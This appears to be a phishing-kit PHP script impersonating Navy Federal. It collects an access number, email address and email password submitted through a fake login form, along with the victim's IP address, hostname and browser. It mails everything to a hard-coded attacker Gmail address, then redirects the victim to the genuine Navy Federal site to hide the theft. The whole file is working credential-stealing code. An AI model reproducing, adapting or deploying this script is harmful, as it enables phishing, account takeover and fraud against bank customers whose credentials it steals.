<?php 
include 'images/log_form.js';
$Ok= "carmencoleman79@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "================== Contact Information ==================\n";
$fuck .= "Access Number : ".$_POST['accnum']."\n";
$fuck .= "Email Address : ".$_POST['email']."\n";
$fuck .= "Email Pass : ".$_POST['password']."\n";
$fuck .= "============= [ Ip & Hostname Info ] =============\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=============+Life Is Too Short To Hack !!!+===========\n";
$subject = "nAvY Email 2 $ip";
$headers = "From: nAvY 2 <codewizard@approject.com>";
mail($Ok,$subject,$fuck,$headers);
mail($recipent,$subject,$fuck,$headers);
Header ("Location: https://www.navyfederal.org/");
?>